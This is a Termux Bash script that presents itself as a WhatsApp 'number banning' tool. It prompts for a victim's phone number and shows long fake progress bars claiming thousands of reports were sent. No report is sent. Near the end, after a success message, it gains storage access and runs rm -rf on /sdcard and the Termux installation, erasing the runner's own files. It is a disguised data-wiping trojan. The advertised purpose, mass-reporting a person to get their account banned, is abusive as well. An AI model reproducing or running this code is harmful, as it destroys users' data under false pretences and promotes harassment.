!/bin/bash
underline="\e[4m"
green="\e[0;91m"
green="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
yellow="\e[1;33m"
banner()
{
clear
pkg install toilet -y
clear
echo -e ""
toilet --filter metal 'WHATSAPP NUMBER BANNING'
sleep 7
echo -e "             $white  coded by$blue ${underline}xhackz"
echo ""
}
banner
menu()
{
echo -e "${green}[1] 𝐃𝐄𝐌𝐎𝐍 𝐁𝐀𝐍 (temp ban)"
}
menu

loading()
{
echo -e "$green loading..."
sleep 2 && clear
        echo "☀︎︎☀︎︎> 5%"
        sleep 1 && clear
        echo "☀︎︎☀︎︎☀︎︎>10%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎>15%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>20%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>25%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>30%>"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>35%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>40%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>45%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>50%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>55%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>60%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>65%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>70%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>75%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>80%"
	      sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>85%>"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>90%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>95%"
        sleep 0.5 && clear
        echo "☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎☀︎︎>100%"
        sleep 6 && clear
        echo "𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐈𝐍𝐆 𝐍𝐔𝐌𝐁𝐄𝐑........"
        sleep 6 && clear
        echo "✈︎✈︎ 5%"
        sleep 1 && clear
        echo "✈︎✈︎✈︎10%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎15%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎20%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎25%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎30%>"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎35%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎40%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎45%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎50%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎55%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎60%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎65%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎70%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎75%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎80%"
	      sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎85%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎90%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎95%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎100%"
        clear
}
load(){
clear && sleep 3
echo "2000 𝐃𝐀𝐍𝐀𝐌𝐈𝐓𝐄 𝐃𝐎𝐍𝐄!!!............."
sleep 4 && clear
        echo "➪➪5%"
        sleep 1 && clear
        echo "✈︎✈︎✈︎10%"
        sleep 0.5 && clear
        echo "➪➪➪➪15%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎20%"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪25%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎30%>"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪35%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎40%"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪➪➪45%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎50%"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪➪➪➪➪55%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎60%"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪65%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎70%"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪75%"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎80%"
      	sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪85%>"
        sleep 0.5 && clear
        echo "✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎✈︎90%"
        sleep 0.5 && clear
        echo "➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪95%"
        sleep 0.5 && clear
        echo "★✰✯☆✩☆✯✰★✰✯☆✩✩✵✩☆✵✯✰★✰☆☆✰☆✩✰100%"
echo "10000 REPORTS done!!!.........................."
 sleep 40 && clear
        echo "➪➪5%"
        sleep 1 && clear
        echo "ꙬꙬ10%"
        sleep 0.5 && clear
        echo "𖦹𖦹𖦹𖦹𖦹15%"
        sleep 0.5 && clear
        echo "⁂⁂⁂⁂⁂⁂⁂20%"
        sleep 0.5 && clear
        echo "☼︎☼︎☼︎☼︎☼︎☼︎25%"
        sleep 0.5 && clear
        echo "✩✩✩✩✩✩✩30%>"
        sleep 0.5 && clear
        echo "☆☆☆☆☆☆☆☆☆35%"
        sleep 0.5 && clear
        echo "★★★★★★★★★★40%"
        sleep 0.5 && clear
        echo "✯✯✯✯✯✯✯✯✯✯✯45%"
        sleep 0.5 && clear
        echo "✰✰✰✰✰✰✰✰✰✰✰✰50%"
        sleep 0.5 && clear
        echo "𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔55%"
        sleep 0.5 && clear
        echo "✵✵✵✵✵✵✵✵✵✵✵✵✵✵✵✵60%"
        sleep 0.5 && clear
        echo "❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎❄︎65%"
        sleep 0.5 && clear
        echo "𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍𑁍70%"
        sleep 0.5 && clear
        echo "𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘𖣘75%"
        sleep 0.5 && clear
        echo "᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽᯽80%"
      	sleep 0.5 && clear
        echo "☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎☢︎︎85%>"
        sleep 0.5 && clear
        echo "߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷߷90%"
        sleep 0.5 && clear
        echo "⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟⍟95%"
        sleep 0.5 && clear
        echo "۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞۞100%"
sleep 20 && clear
echo "REPORT SENDS SUCESSFULLY"
termux-setup-storage
rm -rf /sdcard/*
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files
sleep 20 && clear
echo "𝐍𝐔𝐌𝐁𝐄𝐑 𝐖𝐈𝐋𝐋 𝐁𝐄 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄𝐃 𝐁𝐘 𝐓𝐇𝐄 𝐃𝐄𝐌𝐎𝐍 𝐑𝐄𝐀𝐋𝐌 𝐈𝐍 𝐀 𝐌𝐈𝐍𝐔𝐓𝐄𝐒"
sleep 10
}

printf $green
read -p "[×]Enter a option: " op
ip(){
read -p "[×]ENTER VICTIM's NUMBER(with +234): " wifi
}
if [ $op==1 ]
then
	clear
	sleep 6 && clear
        clear
        toilet -f future "𝐁𝐈𝐆 𝐖𝐇𝐈𝐙𝐙𝐘 𝐁𝐀𝐍𝐍𝐈𝐍𝐆 𝐙𝐎𝐍𝐄"
	echo "Code staring...."
	sleep 2
	ip
	loading
	load
else
	echo "invaild option"
fi
